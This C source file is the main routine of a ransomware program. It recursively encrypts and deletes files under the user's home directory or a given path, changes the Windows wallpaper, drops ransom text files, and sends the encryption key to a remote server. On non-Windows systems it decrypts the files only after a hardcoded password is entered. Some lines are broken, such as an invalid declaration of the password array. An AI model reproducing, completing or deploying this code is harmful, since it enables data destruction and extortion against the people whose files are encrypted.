#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "encrypt.h"
#include "decrypt.h"
#include "global.h"
#include "savekey.h"

void generateAESKey(unsigned char* key) {
    // Generate a random key
    if (!RAND_bytes(key, AES_KEY_SIZE)) {
        fprintf(stderr, "Error generating random key\n");
        exit(EXIT_FAILURE);
    }
}

int main(int argc, char** argv) {
    // Initialise the starting directory
    const char* directory;
    if (argc == 1) {
        #ifdef _WIN32
        directory = getenv("USERPROFILE");
        #else
        directory = getenv("HOME");
        #endif
    } else if (argc == 2) {
        directory = argv[1];
    } else {
        perror("ERROR: Too many arguments\n");
        printf("Usage: %s <starting path>\n", argv[0]);
        return 1;
    }
    // AES key
    unsigned char key[AES_KEY_SIZE];
    generateAESKey(key);
    // Payload
    encryptAndDeleteFilesRecursively(directory, key, fileTypes, numFileTypes);
    #ifdef _WIN32
    changeWallpaper(wallpaperPath);
    #endif
    leaveTextFileInDirectories(directory, textFileName);
    savePrivateKeyToServer(key, serverURL);
    // Terminate program
    #ifdef _WIN32
    return 0;
    #else
    char* password[] = "passw0rd";
    char guess[100];
    while (true) {
        printf("Enter the password: ");
        scanf("%s", guess);
        if (strcmp(guess, password) == 0) {
            decryptAndRestoreFilesRecursively(directory, key, fileTypes, numFileTypes);
            removeTextFileInDirectories(directory, textFileName);
            break;
        }
    }
    return 0;
    #endif
}
